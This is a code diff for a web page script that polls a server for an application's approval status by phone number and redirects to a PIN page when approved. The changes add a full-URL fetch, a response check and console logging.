@@ -57,43 +57,52 @@ body {
 <script>
 const phone = localStorage.getItem("phone");
 
-// If no phone, go back
 if (!phone) {
   window.location.href = "/";
 }
 
+console.log("Phone:", phone);
+
 // CHECK STATUS FUNCTION
 async function checkStatus() {
   try {
-    const res = await fetch("/status/" + phone);
+    // ✅ FIXED: use full URL
+    const url = window.location.origin + "/status/" + phone;
+
+    const res = await fetch(url);
+
+    // ✅ CHECK RESPONSE
+    if (!res.ok) {
+      throw new Error("Server error");
+    }
+
     const data = await res.json();
 
-    // WAITING
+    console.log("Status:", data.status);
+
     if (data.status === "pending") {
       document.getElementById("statusText").innerText = "⏳ Waiting for approval...";
     }
 
-    // APPROVED → GO TO PIN
     else if (data.status === "approved") {
       document.getElementById("statusText").innerText = "✅ Approved! Redirecting...";
-      
+
       setTimeout(() => {
         window.location.href = "/pin.html";
       }, 1500);
     }
 
-    // DECLINED
     else if (data.status === "declined") {
       document.getElementById("statusText").innerText = "❌ Application Declined";
     }
 
-    // UNKNOWN
     else {
       document.getElementById("statusText").innerText = "⚠️ Session expired. Restart.";
     }
 
   } catch (err) {
-    document.getElementById("statusText").innerText = "⚠️ Network error...";
+    console.log("ERROR:", err);
+    document.getElementById("statusText").innerText = "⚠️ Network error... retrying";
   }
 }
 
